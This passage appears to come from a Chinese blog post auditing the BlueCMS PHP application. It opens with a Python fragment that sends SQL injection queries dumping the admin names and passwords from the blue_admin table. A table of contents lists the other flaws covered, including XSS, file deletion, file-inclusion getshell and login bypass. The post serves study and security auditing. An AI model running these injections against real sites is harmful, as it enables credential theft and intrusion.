class="line">a=requests.get(url=url)</span><br><span class="line">print(a.text) #查询当前数据库中的blue__admin表，将blude_admin转化为16进制</span><br><span class="line">s_4=&quot;select group_concat(admin_name,0x3a,pwd) from blue_admin&quot;</span><br><span class="line">url=url_+&#x27;(&#x27;+s_4 +&#x27;)&#x27;</span><br><span class="line">a=requests.get(url=url)</span><br><span class="line">print(a.text) #查询管理员账户和密码</span><br></pre></td></tr></table></figure>
+
+<p>在大佬笔记的加持下完成了一次bluecms从前台到后台的审计 说真的这套cms不是特别大型的cms 也没有利用框架之类的 但是我依然审计的很吃力 归根到底就是对于php基础不扎实以及对开发思维不够了解 这套cms还存在很多的洞 但是还是到此为止</p>
+<p>第一次审计说实话很多地方难以下手 但是审计下来还有有了一套审计的思路 以黑盒+白盒为主 先理清程序的主要逻辑 然后从一些包含全局的文件入手 等等</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># PHP代码审计</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/10/09/CVE-2022-35914-GLPI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="CVE-2022-35914 GLPI注入漏洞复现">
+      <i class="fa fa-chevron-left"></i> CVE-2022-35914 GLPI注入漏洞复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/10/10/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E7%9B%AE%E5%BD%95%E7%B1%BB/" rel="next" title="信息搜集之目录类">
+      信息搜集之目录类 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%BA%E9%99%B71%EF%BC%9A-SERVER%E5%8F%82%E6%95%B0%E6%9C%AA%E8%BF%87%E6%BB%A4"><span class="nav-number">1.</span> <span class="nav-text">缺陷1：$_SERVER参数未过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E1%EF%BC%9Aguest-book-php%E5%AD%98%E5%9C%A8http%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">漏洞1：guest_book.php存在http请求头注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E2%EF%BC%9A%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E7%AD%89%E5%A4%9A%E5%A4%84xss"><span class="nav-number">3.</span> <span class="nav-text">漏洞2：会员中心等多处xss</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E3%EF%BC%9Auser-php%E4%B8%AD%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="nav-number">4.</span> <span class="nav-text">漏洞3：user.php中存在任意文件删除</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%BA%E9%99%B72%EF%BC%9Auser-php%E5%A4%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">5.</span> <span class="nav-text">缺陷2：user.php处文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%BA%E9%99%B73%EF%BC%9A%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E4%B8%8A%E4%BC%A0%E5%A4%B4%E5%83%8F%E5%A4%84%E6%B2%A1%E6%9C%89%E8%BF%9B%E8%A1%8C%E5%86%85%E5%AE%B9%E6%A3%80%E6%9F%A5"><span class="nav-number">6.</span> <span class="nav-text">缺陷3：会员中心上传头像处没有进行内容检查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E4%EF%BC%9Auser-php%E5%A4%84%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell"><span class="nav-number">7.</span> <span class="nav-text">漏洞4：user.php处通过文件包含getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%BA%E9%99%B74%EF%BC%9A%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8%E7%88%86%E7%A0%B4"><span class="nav-number">8.</span> <span class="nav-text">缺陷4：管理员登录处存在爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E5%EF%BC%9A%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8%E5%AE%BD%E5%AD%97%E8%8A%82%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="nav-number">9.</span> <span class="nav-text">漏洞5：管理员登录处利用宽字节万能密码注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E6%EF%BC%9A%E5%B9%BF%E5%91%8A%E5%88%97%E8%A1%A8%E5%A4%84%E5%A4%9A%E5%A4%84%E5%AD%98%E5%9C%A8union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">10.</span> <span class="nav-text">漏洞6：广告列表处多处存在union联合注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E6%EF%BC%9A%E5%B9%BF%E5%91%8A%E5%88%97%E8%A1%A8%E5%A4%84%E5%A4%9A%E5%A4%84%E5%AD%98%E5%9C%A8union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-1"><span class="nav-number">11.</span> <span class="nav-text">漏洞6：广告列表处多处存在union联合注入</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Lzer0Kx"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Lzer0Kx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xiaobaiakai" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xiaobaiakai" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lzer0Kx</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
